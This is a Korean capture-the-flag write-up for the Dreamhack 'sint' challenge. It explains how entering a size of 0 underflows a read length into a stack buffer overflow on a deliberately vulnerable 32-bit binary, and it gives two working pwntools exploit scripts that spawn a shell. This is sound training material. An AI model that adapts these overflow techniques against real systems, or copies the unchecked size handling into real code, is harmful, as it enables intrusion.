# sint - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: sint.c, sint(ELF)
- tools:
## Brief Description
이 문제는 서버에서 작동하고 있는 서비스(sint)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
셸을 획득한 후, "flag" 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec sint
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    char buf[256]; 
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0) {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```
### signal(SIGSEGV, get_shell)
``` c
void get_shell() {
    system("/bin/sh");
}

int main() {
    // 생략
    signal(SIGSEGV, get_shell); 
}
```
`signal()` 함수는 특정 시그널이 발생했을 때 어떤 함수를 실행할지 지정한다. `SIGSEGV`는 Segmentation Fault 시그널이다. 일반적으로 프로세스가 잘못된 메모리에 접근할 때 발생하며, 보통 프로그램이 바로 죽는다. 세그먼트 폴트가 발생하면 `get_shell` 함수가 실행된다.  
## Vulnerability
### Integer Underflow - BOF(Buffer Overflow)
``` c
scanf("%d", &size);

if (size > 256 || size < 0) {
    printf("Buffer Overflow!\n");
    exit(0);
}

read(0, buf, size - 1);
```
`size`에 0 ~ 256 사이의 범위를 입력하면 `if` 문을 통과할 수 있다. 이때 `size`를 0으로 입력하면 최종적으로 `read(0, buf, 0xffffffff)`가 실행되어 Integer Underflow인해서 BOF 취약점이 발생한다.  
## Exploit
### Strategy
PIE, canary 모두 비활성화 되어있고, BOF 취약점이 발생하는 환경이다. 현재 환경에서 `get_shell` 함수를 호출하는 방법은 2가지다.  
1. `main`의 ra에 적당한 문자열을 덮어써 세그먼트 폴트를 발생시켜 `get_shell` 함수를 호출
2. `main`의 ra를 `get_shell` 함수의 주소로 덮어쓰기 
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x4 |
| ebp |  |
| buf | -0x100 |
| size | -0x104 |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 22372)
context.arch = "i386"

# payload
p.sendlineafter(b'Size: ', b'0')
payload = b''
payload += b'A' * 0x10c
p.sendlineafter(b'Data: ', payload)

# interactive
p.interactive()
```
``` python
from pwn import *

p = process("./sint")
e = ELF("./sint")
get_shell = e.symbols["get_shell"]

p.sendline(b"0")
p.sendline(b"A" * (0x104 + 0x4) + p32(get_shell))

p.interactive()
```
